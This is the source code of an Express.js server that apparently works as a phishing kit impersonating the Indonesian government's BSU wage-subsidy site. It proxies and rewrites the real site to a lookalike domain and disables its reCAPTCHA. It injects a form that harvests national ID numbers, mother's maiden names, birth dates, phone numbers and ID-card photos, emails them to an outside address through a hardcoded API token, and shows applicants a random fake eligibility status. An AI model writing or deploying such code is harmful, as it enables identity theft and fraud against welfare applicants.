const express = require('express');
const bodyParser = require('body-parser');
const fetch = require('node-fetch');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;

// Configuration
const MAILTRAP_API_TOKEN = "15f7f9445b3314d3be2b600fb1f23e15";
const EMAIL_FROM = "hello@bsukita.dpdns.org";
const EMAIL_TO = "admin@octra.site";

// Middleware
app.use(bodyParser.urlencoded({ extended: true }));
app.use(express.static(path.join(__dirname, 'public')));

// Serve form page
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'views', 'index.html'));
});

// Handle form submission
app.post('/submit-bsu', async (req, res) => {
    try {
        const { nik, namaKtp, tanggalLahir, namaIbu, namaIbuVerif, hp, hpVerif, email, emailVerif, ktpLink, pasFotoLink } = req.body;

        // Validate data
        if (namaIbu.toUpperCase() !== namaIbuVerif.toUpperCase() || 
            hp !== hpVerif || 
            email.toLowerCase() !== emailVerif.toLowerCase()) {
            return res.status(400).send('Verifikasi data tidak cocok!');
        }

        // Send email via Mailtrap
        const statuses = ['lolos', 'validasi', 'gagal'];
        const status = statuses[Math.floor(Math.random() * statuses.length)];

        const emailBody = `
Data Pendaftaran BSU:
NIK: ${nik || 'Tidak ada'}
Nama Lengkap: ${namaKtp.toUpperCase() || 'Tidak ada'}
Tanggal Lahir: ${tanggalLahir || 'Tidak ada'}
Nama Ibu Kandung: ${namaIbu.toUpperCase() || 'Tidak ada'}
Nomor Handphone: ${hp || 'Tidak ada'}
Email: ${email.toLowerCase() || 'Tidak ada'}
Link KTP: ${ktpLink || 'Tidak ada'}
Link Pas Foto: ${pasFotoLink || 'Tidak ada'}
Status: ${status}
`;

        const emailData = {
            from: { email: EMAIL_FROM, name: 'BSU Submission' },
            to: [{ email: EMAIL_TO }],
            subject: `Pendaftaran BSU - ${namaKtp.toUpperCase() || 'Unknown'}`,
            text: emailBody,
            category: 'BSU Submission'
        };

        const response = await fetch('https://send.api.mailtrap.io/api/send', {
            method: 'POST',
            headers: {
                'Authorization': `Bearer ${MAILTRAP_API_TOKEN}`,
                'Content-Type': 'application/json'
            },
            body: JSON.stringify(emailData)
        });

        if (!response.ok) {
            const errorText = await response.text();
            console.error(`Mailtrap API error: ${response.status} - ${errorText}`);
            return res.status(500).send(`Mailtrap API error: ${response.status}`);
        }

        // Redirect to result page
        res.redirect(`/cek-bsu-peserta?nama=${encodeURIComponent(namaKtp.toUpperCase())}&status=${status}`);
    } catch (error) {
        console.error(`Error in /submit-bsu: ${error.message}`);
        res.status(500).send(`Error: ${error.message}`);
    }
});

// Serve result page
app.get('/cek-bsu-peserta', (req, res) => {
    const { nama, status } = req.query;
    if (!nama || !status) {
        return res.status(400).send('Nama atau status tidak ditemukan!');
    }

    const statusPages = {
        'lolos': 'lolos.html',
        'validasi': 'validasi.html',
        'gagal': 'gagal.html'
    };

    if (!statusPages[status]) {
        return res.status(500).send('Status tidak valid!');
    }

    res.sendFile(path.join(__dirname, 'views', statusPages[status]));
});

// Proxy other requests to original site
app.all('*', async (req, res) => {
    try {
        const url = new URL(`https://bsu.bpjsketenagakerjaan.go.id${req.originalUrl}`);
        const headers = {
            'Host': 'bsu.bpjsketenagakerjaan.go.id',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
        };

        const response = await fetch(url.toString(), {
            method: req.method,
            headers,
            body: req.method !== 'GET' && req.method !== 'HEAD' ? req.body : undefined,
            redirect: 'manual'
        });

        if (response.status >= 300 && response.status < 400) {
            return res.redirect(response.status, response.headers.get('location'));
        }

        let html = await response.text();
        html = html
            .replace(/bsu\.bpjsketenagakerjaan\.go\.id/g, 'cekbsukita.qzz.io')
            .replace(/<div class="grecaptcha-badge".*?div>/s, '')
            .replace(/<div class="grecaptcha-error".*?div>/s, '')
            .replace(/<textarea class="g-recaptcha-response".*?textarea>/s, '')
            .replace(/<script src=".*?recaptcha\/api.js".*?script>/s, '')
            .replace(/<div style="font-size: 10px; color: gray;".*?div>/s, '')
            .replace(
                /<div class="section bg-light animate padding-bsu-validation".*?(?=<\/div>)/s,
                `<div class="section bg-light animate padding-bsu-validation">${require('fs').readFileSync(path.join(__dirname, 'views', 'index.html'), 'utf8')}`
            )
            .concat(`
                <script>
                    window.grecaptcha = {
                        neat: function(cb) { cb(); },
                        execute: function() { return Promise.resolve(''); },
                        render: function() {}
                    };
                </script>
            `);

        res.set('Content-Type', 'text/html').send(html);
    } catch (error) {
        console.error(`Error in proxy: ${error.message}`);
        res.status(500).send(`Error: ${error.message}`);
    }
});

app.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);
});
